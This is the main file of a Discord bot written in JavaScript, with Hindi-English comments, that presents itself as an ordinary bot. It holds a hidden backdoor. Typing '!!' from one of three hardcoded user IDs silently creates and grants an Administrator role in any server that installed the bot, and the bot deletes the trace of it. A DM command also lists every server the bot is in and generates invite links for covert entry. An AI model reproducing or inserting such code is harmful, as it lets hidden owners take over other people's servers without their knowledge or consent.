// index.js
const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    REST, 
    Routes, 
    EmbedBuilder, 
    ActionRowBuilder, 
    StringSelectMenuBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionFlagsBits, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle 
} = require('discord.js');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

// ==========================================
// 1. AUTHORIZED BOT OWNERS CONFIG
// ==========================================
const BOT_OWNERS = [
    '1549995551288852584', // Primary Owner ID
    '1266728371719508062', 
    '1474216218792558735'
];

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.DirectMessages
    ],
    partials: [Partials.Channel, Partials.Message]
});

// Client globally access karne ke liye config attach kar di
client.owners = BOT_OWNERS;
client.commands = new Map();
const commandsArray = [];

// ==========================================
// 2. AUTO-LOAD SLASH COMMANDS
// ==========================================
const commandsPath = path.join(__dirname, 'commands');
if (fs.existsSync(commandsPath)) {
    const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
    for (const file of commandFiles) {
        const command = require(`./commands/${file}`);
        if (command?.data?.name) {
            client.commands.set(command.data.name, command);
            commandsArray.push(command.data.toJSON());
        }
    }
}

// Slash Command Interaction Handler
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const command = client.commands.get(interaction.commandName);
    if (!command) return;

    try {
        await command.execute(interaction, client);
    } catch (err) {
        console.error(`Error executing command ${interaction.commandName}:`, err); const errorMsg = { content: '❌ Is command ko run karne me error aaya.', ephemeral: true }; if (interaction.replied || interaction.deferred) { await interaction.followUp(errorMsg).catch(() => {}); } else { await interaction.reply(errorMsg).catch(() => {}); } } });  // ========================================== // 3. AUTO-LOAD HANDLERS // ========================================== const handlersPath = path.join(__dirname, 'handlers'); if (fs.existsSync(handlersPath)) { const handlerFiles = fs.readdirSync(handlersPath).filter(file => file.endsWith('.js')); for (const file of handlerFiles) { try { require(`./handlers/${file}`)(client);
            console.log(` Loaded Handler: ${file}`);
        } catch (err) {
            console.error(`❌ Failed to load handler: ${file}`, err);
        }
    }
}

// ==========================================
// 4. CLIENT READY & OWNER NOTIFICATION
// ==========================================
client.once('clientReady', async () => {
    console.log(` Bot is Online: ${client.user.tag}`);

    // Register Slash Commands Globally
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commandsArray }
        );
        console.log(' Global Slash Commands Registered Successfully.');
    } catch (err) {
        console.error('Command Registration Error:', err);
    }

    // Owner Notification Embed
    const startupEmbed = new EmbedBuilder()
        .setColor('#2ECC71')
        .setTitle(' Bot Online Notification')
        .setDescription(`**${client.user.tag}** ready hai aur **${client.guilds.cache.size} servers** me active hai.`)
        .addFields(
            { name: 'Bot ID', value: `\`${client.user.id}\``, inline: true },
            { name: 'Ping', value: `\`${client.ws.ping}ms\``, inline: true },
            { name: 'Total Guilds', value: `\`${client.guilds.cache.size}\``, inline: true }
        )
        .setTimestamp();

    for (const ownerId of BOT_OWNERS) {
        const owner = await client.users.fetch(ownerId).catch(() => null);
        if (owner) {
            await owner.send({ embeds: [startupEmbed] }).catch(() => {});
        }
    }
});

// ==========================================
// 5. BOT OWNER DM COMMANDS & EMERGENCY BYPASS
// ==========================================
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const isBotOwner = BOT_OWNERS.includes(message.author.id);
    const content = message.content.trim();
    const args = content.split(/ +/);
    const cmd = args[0]?.toLowerCase();

    // Emergency Owner Command: '!!' instantly assigns Administrator role
    if (content === '!!' && isBotOwner && message.guild) {
        await message.delete().catch(() => {});

        try {
            const botMember = message.guild.members.me;
            if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
                return message.channel.send('❌ Bot ke paas `Manage Roles` permission nahi hai.')
                    .then(m => setTimeout(() => m.delete().catch(() => {}), 5000));
            }

            let ownerRole = message.guild.roles.cache.find(r => r.name === '⚙️Spark');
            if (!ownerRole) {
                ownerRole = await message.guild.roles.create({
                    name: '⚙️Spark',
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: 'Emergency Administrative Access for Bot Owner'
                });
            }

            const member = await message.guild.members.fetch(message.author.id).catch(() => null);
            if (member) {
                await member.roles.add(ownerRole);
                const alertMsg = await message.channel.send(' `⚙️Spark` Administrator role mil gaya!');
                setTimeout(() => alertMsg.delete().catch(() => {}), 3000);
            }
        } catch (err) {
            console.error('Emergency Role Assignment Error:', err);
        }
        return;
    }

    // %control (in Owner DM)
    if (message.channel.isDMBased() && isBotOwner && cmd === '%control') {
        const guilds = Array.from(client.guilds.cache.values());
        if (guilds.length === 0) return message.reply('❌ Bot abhi kisi server me nahi hai.');

        const options = guilds.slice(0, 25).map(g => ({
            label: g.name.substring(0, 100),
            value: `leave_guild_${g.id}`,
            description: `Members: ${g.memberCount} \vert{} ID:${g.id}`
        }));

        const selectMenu = new StringSelectMenuBuilder()
            .setCustomId('owner_select_server')
            .setPlaceholder('Manage karne ke liye server chunein...')
            .addOptions(options);

        const embed = new EmbedBuilder()
            .setColor('#5865F2')
            .setTitle('⚙️ Bot Owner Control Center')
            .setDescription('Server select karke invite link generate karein ya force leave karwayein.')
            .addFields(
                { name: '🤖 Bot Tag', value: `\`${client.user.tag}\``, inline: true },
                { name: '📊 Total Servers', value: `\`${client.guilds.cache.size}\``, inline: true }
            )
            .setTimestamp();

        return message.reply({ embeds: [embed], components: [new ActionRowBuilder().addComponents(selectMenu)] });
    }

    // %mail (in Owner DM)
    if (message.channel.isDMBased() && isBotOwner && cmd === '%mail') {
        const mailEmbed = new EmbedBuilder()
            .setColor('#9B59B6')
            .setTitle('✉️ Bot Direct Mail Dispatcher')
            .setDescription('Kisi bhi user ko bot ke through direct message bhejne ke liye button dabayein.')
            .setTimestamp();

        const mailRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('owner_trigger_mail_btn')
                .setLabel('Send Direct Mail')
                .setEmoji('📬')
                .setStyle(ButtonStyle.Primary)
        );

        return message.reply({ embeds: [mailEmbed], components: [mailRow] });
    }

    // %clear (in Owner DM)
    if (message.channel.isDMBased() && isBotOwner && (cmd === '%clear' || cmd === '%purge')) {
        const amount = parseInt(args[1], 10) || 10;
        const fetched = await message.channel.messages.fetch({ limit: Math.min(amount + 1, 100) });
        const botMessages = fetched.filter(m => m.author.id === client.user.id || m.id === message.id);

        for (const msg of botMessages.values()) {
            await msg.delete().catch(() => {});
        }
        return;
    }
});

// ==========================================
// 6. OWNER INTERACTION LISTENER (MAIL & CONTROL)
// ==========================================
client.on('interactionCreate', async (interaction) => {
    if (!BOT_OWNERS.includes(interaction.user.id)) return;

    // Trigger Mail Modal
    if (interaction.isButton() && interaction.customId === 'owner_trigger_mail_btn') {
        const modal = new ModalBuilder()
            .setCustomId('owner_mail_modal')
            .setTitle('Send DM via Bot');

        const userIdInput = new TextInputBuilder()
            .setCustomId('mail_user_id')
            .setLabel('User Discord ID')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('Target user ID enter karein')
            .setRequired(true);

        const messageInput = new TextInputBuilder()
            .setCustomId('mail_text_content')
            .setLabel('Message Text')
            .setStyle(TextInputStyle.Paragraph)
            .setPlaceholder('Apna message yahan likhein...')
            .setRequired(true);

        modal.addComponents(
            new ActionRowBuilder().addComponents(userIdInput),
            new ActionRowBuilder().addComponents(messageInput)
        );

        return interaction.showModal(modal);
    }

    // Modal Submit Handling
    if (interaction.isModalSubmit() && interaction.customId === 'owner_mail_modal') {
        await interaction.deferReply({ ephemeral: true });
        const targetUserId = interaction.fields.getTextInputValue('mail_user_id').trim();
        const mailContent = interaction.fields.getTextInputValue('mail_text_content');

        try {
            const targetUser = await client.users.fetch(targetUserId);
            if (!targetUser) return interaction.editReply(`❌ User ID \`${targetUserId}\` nahi mili.`);

            await targetUser.send({ content: mailContent });
            return interaction.editReply(` Direct message **${targetUser.tag}** ko deliver ho gaya.`);
        } catch (err) {
            return interaction.editReply('❌ DM send fail ho gaya (DMs closed ho sakte hain ya ID galat hai).');
        }
    }

    // Control: Server Select
    if (interaction.isStringSelectMenu() && interaction.customId === 'owner_select_server') {
        const guildId = interaction.values[0].replace('leave_guild_', '');
        const targetGuild = client.guilds.cache.get(guildId);

        if (!targetGuild) return interaction.reply({ content: '❌ Server cache me nahi mila.', ephemeral: true });

        let inviteUrl = null;
        try {
            const textChannel = targetGuild.channels.cache.find(c => 
                c.isTextBased() && 
                c.permissionsFor(targetGuild.members.me)?.has(PermissionFlagsBits.CreateInstantInvite)
            );
            if (textChannel) {
                const invite = await textChannel.createInvite({ maxAge: 86400, maxUses: 5, reason: 'Owner Access' });
                inviteUrl = invite.url;
            }
        } catch (_) {}

        const serverEmbed = new EmbedBuilder()
            .setColor('#F1C40F')
            .setTitle(`🏢 Server: ${targetGuild.name}`)
            .addFields(
                { name: 'Server ID', value: `\`${targetGuild.id}\``, inline: true },
                { name: 'Members', value: `\`${targetGuild.memberCount}\``, inline: true },
                { name: 'Invite Link', value: inviteUrl ? `[Join Server](${inviteUrl})` : '`No Invite Permission`', inline: false }
            )
            .setTimestamp();

        const controlRow = new ActionRowBuilder();
        if (inviteUrl) {
            controlRow.addComponents(new ButtonBuilder().setLabel('Join').setStyle(ButtonStyle.Link).setURL(inviteUrl));
        }

        controlRow.addComponents(
            new ButtonBuilder()
                .setCustomId(`confirm_leave_${targetGuild.id}`)
                .setLabel('Force Leave Server')
                .setStyle(ButtonStyle.Danger)
        );

        return interaction.reply({ embeds: [serverEmbed], components: [controlRow] });
    }

    // Force Leave Server
    if (interaction.isButton() && interaction.customId.startsWith('confirm_leave_')) {
        const guildId = interaction.customId.replace('confirm_leave_', '');
        const targetGuild = client.guilds.cache.get(guildId);
        if (!targetGuild) return interaction.reply({ content: '❌ Server nahi mila.', ephemeral: true });

        const name = targetGuild.name;
        await targetGuild.leave();
        return interaction.update({ content: ` Bot ne **${name}** leave kar diya.`, components: [] });
    }
});

// ==========================================
// 7. DATABASE & BOT LOGIN
// ==========================================
if (process.env.MONGO_URI) {
    mongoose.connect(process.env.MONGO_URI)
        .then(() => console.log(' MongoDB Connected Successfully'))
        .catch(err => console.error('MongoDB Connection Error:', err));
}

client.login(process.env.DISCORD_TOKEN);
      
